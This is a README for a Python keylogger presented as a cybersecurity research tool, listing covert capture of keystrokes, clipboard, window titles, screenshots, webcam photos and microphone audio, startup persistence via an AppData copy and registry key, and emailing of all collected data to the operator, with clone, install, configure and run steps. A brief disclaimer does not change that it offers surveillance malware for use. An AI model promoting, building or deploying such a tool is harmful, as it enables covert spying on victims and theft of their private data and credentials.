# Ultimate Python Key Logger

A comprehensive surveillance tool built for cybersecurity research. This key logger goes beyond simple keystroke capturing to include system monitoring, multimedia recording, and persistence.

## ⚠️ Disclaimer

**This tool is for educational purposes only.**
Unauthorized use of surveillance software is illegal. Ensure you have explicit permission from the device owner. The author is not responsible for any misuse.

## Features

- **Keystroke Logging**: Captures all keys pressed.
- **Active Window Logging**: Records the window title.
- **Clipboard Monitoring**: Logs copied text.
- **System Information**: Logs IP, Hostname, etc.
- **Multimedia Recording**:
  - **Screenshots**: Captures screen periodically.
  - **Webcam**: Takes photos from the webcam.
  - **Microphone**: Records short audio clips.
- **Encryption**: Logs are encrypted (AES/Fernet).
- **Persistence**: Automatically runs on system startup (copies to AppData + Registry key).
- **Email Reporting**: Sends all collected data to your email.

## Prerequisites

- Python 3.x
- Windows OS (required for persistence and window logging)

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/joemunene-by/Key-logger.git
    cd Key-logger
    ```

2. Install dependencies:

    ```bash
    pip install -r requirements.txt
    ```

## Usage

1. **Configuration**:
    Edit `main.py` to set your email credentials:

    ```python
    keylogger = KeyLogger(
        time_interval=300,         # Report interval in seconds
        email="your_email@gmail.com",
        password="your_app_password"
    )
    ```

2. **Run**:

    ```bash
    python main.py
    ```

3. **Output**:
    - `keylog.enc`: Encrypted log.
    - `screenshot_*.png`: Screenshots.
    - `webcam_*.jpg`: Webcam photos.
    - `audio_*.wav`: Audio recordings.

## Decryption

Use the `key.key` generated on the first run to decrypt your logs (see `main.py` logic or create a decryption script).
